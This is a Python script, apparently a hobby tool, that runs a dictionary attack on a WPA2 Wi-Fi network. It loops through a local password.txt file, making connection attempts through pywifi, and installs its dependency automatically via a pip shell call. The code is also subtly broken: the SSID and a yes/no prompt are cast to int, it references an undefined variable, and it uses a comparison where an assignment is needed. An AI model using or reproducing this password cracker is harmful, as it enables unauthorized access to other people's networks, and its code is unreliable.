# coding=utf8
import imp
import os
import time
#Installing the modules required.
def install_module(found,module):
    print("This program requires "+ module +".Checking for you ...")
    time.sleep(1)
    try:
        imp.find_module(module)
        found = True
    except ImportError:
        found = False
    if found==True :
        print("You have installed " + module + ".")
    else:
        print("You have not installed " + module + " yet.Installing for you ...")
    while found==False :
        os.system(f'pip install {module}')
        try:
            imp.find_module(module)
            found = True
        except ImportError:
            found = False
        if found == True :
            break
found1=False
install_module(found1,"pywifi")

#Disconnect existing wifi connection
import pywifi
from pywifi import const
wifi = pywifi.PyWiFi()
iface = wifi.interfaces()[0]
iface.name()
wifistatus = iface.status()
print("This program will disconnect your wifi connection temporarily.")
if wifistatus == const.IFACE_DISCONNECTED :
    pass
else :
    ifaces.disconnect()
    time.sleep(1)
    wifistatus = iface.status()

#Fetch the information we need.
ssid = int(input("Tap in the ssid of the wifi needed ... "))

#Define some basic functions.
def connect(ssid,password):
    while iface.status() == const.IFACE_CONNECTED:
        iface.disconnect()
        time.sleep(1)
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.key = password
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    iface.remove_all_network_profiles()
    temp_profile = iface.add_network_profile(profile)
    iface.connect(temp_profile)
    time.sleep(1)
    if iface.status == const.IFACE_CONNECTED:
        return True
    else :
        return False

#Make sure that there exist password.txt under the working directory.
sure = False
while sure == False :
    a = int(input("After making sure that there exists a file named 'password.txt',tap 'y' to continue"))
    if a == "y" :
        sure = True

#The crack process now begins.
print("The crack process NOW BEGINS!")
path = r'password.txt'
file = open(path,"r")
test == False
dictionary = file.readlines()
for password in dictionary :
    print("Trying " + password)
    test = connect(ssid,password)
    if test == True :
        break

#Print the result.
if test == True :
    print("The password of " + ssid +" is  " + password + ".")
else :
    print("The password of the network cannot be found.")
